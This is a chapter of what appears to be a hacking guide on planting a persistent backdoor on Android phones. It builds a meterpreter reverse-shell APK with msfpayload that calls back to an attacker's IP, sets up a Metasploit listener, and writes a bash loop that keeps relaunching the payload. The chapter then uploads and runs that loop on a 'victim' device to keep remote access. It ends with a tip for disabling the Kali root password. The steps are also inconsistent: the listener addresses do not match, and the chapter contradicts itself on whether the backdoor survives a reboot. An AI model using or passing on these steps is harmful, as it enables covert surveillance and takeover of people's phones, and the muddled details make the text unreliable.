    # Chapter 8 Creating a Persistent Backdoor in Android


    Once you have created a backdoor in Android, it is possible for you to make it
    persistent. In this chapter, we will show you how to achieve this via bash scripting.
    The following step will help you achieve this:


    In this case, we will be using VM so as to hack on a WAN. First, run the following
    command so as to create a backdoor:


    ```

    msfpayload android/meterpreter/reverse_tcp LHOST=182.68.42.6 R > /root/file.apk

    ```


    After that, run the following sequence of commands so as to set the listener:


    - `msfconsole`

    - `use exploit/multi/handler`

    - `set payload android/meterpreter/reverse_tcp`

    - `set LHOST 192.168.0.4`

    - `exploit`


    Once the user has run and installed the file named `file.apk`, the meterpreter
    will be opened.


    After that, we can begin to create the persistent script. Here are few lines of
    code which should be copied into a notepad file named `script.sh`, while ensuring
    that you don’t forget the `.sh` extension as it is very important. It signifies
    that we are creating a shell file. Here are the lines of code:


    ```bash

    #!/bin/bash

    while true

    do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity

    sleep 20

    done

    ```


    Note that the lines 3 and 4 are just a single line which has been continuing,
    so do not add a line break between the two. The first line in the above script,
    `#!/bin/bash` is very important, as it denotes that this is a shell script. The
    `sleep` parameter can be set to any number of seconds you want your script to
    sleep for. You should then copy this script to the folder in `Home/Root` in the
    kali Linux.


    However, we should update our script so that it may be compatible with any Android
    system. However, note that you should not copy and paste this script, but write
    it on your own, otherwise, it may fail to work. Here is the code:


    ```bash

    #!/bin/bash

    while :

    do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity

    sleep 20

    done

    ```


    Make sure that you leave a space between the `while` and the `:`. The script has
    no multiple spaces and there is no space between line 3 and 4.


    ## Uploading the Script


    Our aim is to upload our script to the Android system which has been hacked. The
    scritp should be uploaded to the directory named `etc/init.d/` so that it may
    remain persistent even after a reboot.


    First, navigate to the root directory by running the following command:


    ```bash

    cd /

    ```


    You will then be taken to the root directory, and for you to verify this, you
    can run the following command:


    ```

    Ls

    ```


    After that, change directory to the `/etc` directory by typing the following command:


    ```bash

    cd etc

    ```


    Again, change to the `init.d` directory as follows, and then list the contents
    of the directory:


    ```

    cd init.d

    ls

    ```


    Assuming that you had saved your script file with the name `anything.sh`, you
    can run the following command so as to upload it:


    ```

    upload anything.sh

    ```


    Note that root access is needed for us to complete the command.


    We need to keep the application persistent until a reboot has been done. However,
    this app will no longer be persistent once the Android system on victim goes for
    some reboot. The following sequence of commands can help us upload the script
    anywhere on the sdcard:


    ```bash

    cd /

    cd /sdcard/Download

    ls

    upload anything.sh

    ```


    The upload will then be complete!


    ## Running the Script


    Now that you have the script uploaded, it is time for us to run or execute it.
    The execution of the script should only be done once, and it will automatically
    accomplish the rest of the tasks.


    Type the following command so as to get to the shell of the system:


    ```

    Shell

    ```


    You can then use the following set of commands so as to get the directory of the
    script:


    ```bash

    cd /

    cd /sdcard/Download

    ls

    ```


    Remember we had saved our script as `anything.sh`. To execute it, run the command
    given below:


    ```bash

    sh anything.sh

    ```


    The command will then activate the script in your system. You should terminate
    the shell by pressing `Ctrl + C`. Even though you will have terminated the shell,
    your script will remain active and running, so you don’t have to worry about this.


    You can eliminate the script by rebooting the system or by using a task killer.
    You will then have established a persistent backdoor for the hacked Android system.


    However, you should always be aware that this persistence will remain until the
    time the system is rebooted. For those hacking on some Wan by use of a dynamic
    IP address, this persistence will only remain until the time the IP changes or
    the router is rebooted. If you need to eliminate the script which is running,
    you have to reboot the Android system, and this is for those who are doing the
    testing on an Android system.


    If your Android system has been rooted and you are using a static public IP, this
    persistence will remain on your WAN forever. In the case of a LAN, the persistence
    will also remain forever.


    ## Testing


    To do the testing, just exit the meterpreter, and then set the listener again.
    The meterpreter prompt should be presented to you automatically. You can then
    run the `exploit` command so as to do the exploitation.


    ## Avoid Root Password in Kali Linux


    If you are not in need of a root password in your Kali Linux Live USB for a persistent
    login, you can go ahead and reset this to a default `toor`.


    You should use the `root` command so as to change the password, edit the `/lib/live/config/0031-root-passwords`,
    and then the comment line which is given below:


    before: `usermod -p ''X014elvznJq7E'' root`


    after: `# usermod -p ''X014elvznJq7E'' root`


    That is it!


